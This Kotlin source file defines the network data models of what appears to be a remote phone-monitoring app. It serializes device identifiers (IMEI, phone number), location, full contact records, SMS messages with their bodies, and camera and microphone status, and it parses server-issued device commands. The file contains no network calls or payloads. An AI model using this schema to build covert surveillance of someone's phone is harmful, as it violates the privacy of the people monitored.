package com.hawkshaw.library.network

import org.json.JSONArray
import org.json.JSONObject
import java.util.*

sealed class ApiResponse<out T> {
    data class Success<T>(val data: T) : ApiResponse<T>()
    data class Error(val message: String) : ApiResponse<Nothing>()
}

data class DeviceRegistrationRequest(
    val deviceId: String,
    val deviceName: String,
    val model: String?,
    val manufacturer: String?,
    val androidVersion: String?,
    val apiLevel: Int?,
    val imei: String?,
    val phoneNumber: String?,
    val fcmToken: String?,
    val appVersion: String?
)

data class DeviceRegistrationResponse(
    val deviceToken: String,
    val message: String
)

data class HeartbeatRequest(
    val batteryLevel: Int?,
    val isCharging: Boolean,
    val networkType: String?,
    val locationEnabled: Boolean,
    val cameraEnabled: Boolean,
    val microphoneEnabled: Boolean,
    val storageTotal: Long?,
    val storageAvailable: Long?,
    val ramTotal: Long?,
    val ramAvailable: Long?
)

data class LocationData(
    val latitude: Double,
    val longitude: Double,
    val altitude: Double?,
    val accuracy: Float?,
    val speed: Float?,
    val bearing: Float?,
    val provider: String?,
    val address: String?,
    val timestamp: Long,
    val batteryLevel: Int?,
    val networkType: String?,
    val isMock: Boolean
)

data class MediaMetadata(
    val capturedAt: Date,
    val latitude: Double?,
    val longitude: Double?,
    val duration: Long?,
    val width: Int?,
    val height: Int?,
    val additionalData: Map<String, Any>?
) {
    fun toJson(): String {
        val json = JSONObject()
        json.put("captured_at", capturedAt.time)
        latitude?.let { json.put("latitude", it) }
        longitude?.let { json.put("longitude", it) }
        duration?.let { json.put("duration", it) }
        width?.let { json.put("width", it) }
        height?.let { json.put("height", it) }
        additionalData?.let { data ->
            val additionalJson = JSONObject()
            data.forEach { (key, value) ->
                additionalJson.put(key, value)
            }
            json.put("additional_data", additionalJson)
        }
        return json.toString()
    }
}

data class ContactData(
    val contactId: String,
    val displayName: String?,
    val givenName: String?,
    val familyName: String?,
    val phoneNumbers: List<PhoneNumber>?,
    val emailAddresses: List<EmailAddress>?,
    val postalAddresses: List<PostalAddress>?,
    val organization: String?,
    val jobTitle: String?,
    val photoUri: String?,
    val starred: Boolean,
    val timesContacted: Int,
    val lastTimeContacted: Date?,
    val customRingtone: String?,
    val sendToVoicemail: Boolean,
    val notes: String?
) {
    fun toJson(): JSONObject {
        val json = JSONObject()
        json.put("contact_id", contactId)
        json.put("display_name", displayName)
        json.put("given_name", givenName)
        json.put("family_name", familyName)
        
        phoneNumbers?.let { phones ->
            val phoneArray = JSONArray()
            phones.forEach { phone ->
                val phoneJson = JSONObject()
                phoneJson.put("number", phone.number)
                phoneJson.put("type", phone.type)
                phoneJson.put("label", phone.label)
                phoneArray.put(phoneJson)
            }
            json.put("phone_numbers", phoneArray)
        }
        
        emailAddresses?.let { emails ->
            val emailArray = JSONArray()
            emails.forEach { email ->
                val emailJson = JSONObject()
                emailJson.put("address", email.address)
                emailJson.put("type", email.type)
                emailJson.put("label", email.label)
                emailArray.put(emailJson)
            }
            json.put("email_addresses", emailArray)
        }
        
        postalAddresses?.let { addresses ->
            val addressArray = JSONArray()
            addresses.forEach { address ->
                val addressJson = JSONObject()
                addressJson.put("formatted_address", address.formattedAddress)
                addressJson.put("type", address.type)
                addressJson.put("label", address.label)
                addressArray.put(addressJson)
            }
            json.put("postal_addresses", addressArray)
        }
        
        json.put("organization", organization)
        json.put("job_title", jobTitle)
        json.put("photo_uri", photoUri)
        json.put("starred", starred)
        json.put("times_contacted", timesContacted)
        lastTimeContacted?.let { json.put("last_time_contacted", it.time) }
        json.put("custom_ringtone", customRingtone)
        json.put("send_to_voicemail", sendToVoicemail)
        json.put("notes", notes)
        
        return json
    }
}

data class PhoneNumber(
    val number: String,
    val type: Int,
    val label: String?
)

data class EmailAddress(
    val address: String,
    val type: Int,
    val label: String?
)

data class PostalAddress(
    val formattedAddress: String,
    val type: Int,
    val label: String?
)

data class SMSData(
    val smsId: String,
    val threadId: String?,
    val address: String,
    val person: String?,
    val date: Date,
    val dateSent: Date?,
    val protocol: Int?,
    val read: Boolean,
    val status: Int?,
    val type: String,
    val replyPathPresent: Boolean,
    val subject: String?,
    val body: String?,
    val serviceCenter: String?,
    val locked: Boolean,
    val errorCode: Int?,
    val seen: Boolean
) {
    fun toJson(): JSONObject {
        val json = JSONObject()
        json.put("sms_id", smsId)
        json.put("thread_id", threadId)
        json.put("address", address)
        json.put("person", person)
        json.put("date", date.time)
        dateSent?.let { json.put("date_sent", it.time) }
        json.put("protocol", protocol)
        json.put("read", read)
        json.put("status", status)
        json.put("type", type)
        json.put("reply_path_present", replyPathPresent)
        json.put("subject", subject)
        json.put("body", body)
        json.put("service_center", serviceCenter)
        json.put("locked", locked)
        json.put("error_code", errorCode)
        json.put("seen", seen)
        return json
    }
}

data class DeviceCommand(
    val id: String,
    val commandType: String,
    val commandData: JSONObject?,
    val priority: String,
    val createdAt: Date,
    val expiresAt: Date?
) {
    companion object {
        fun fromJson(json: JSONObject): DeviceCommand {
            return DeviceCommand(
                id = json.getString("id"),
                commandType = json.getString("command_type"),
                commandData = json.optJSONObject("command_data"),
                priority = json.getString("priority"),
                createdAt = Date(json.getLong("created_at")),
                expiresAt = if (json.has("expires_at")) Date(json.getLong("expires_at")) else null
            )
        }
    }
}
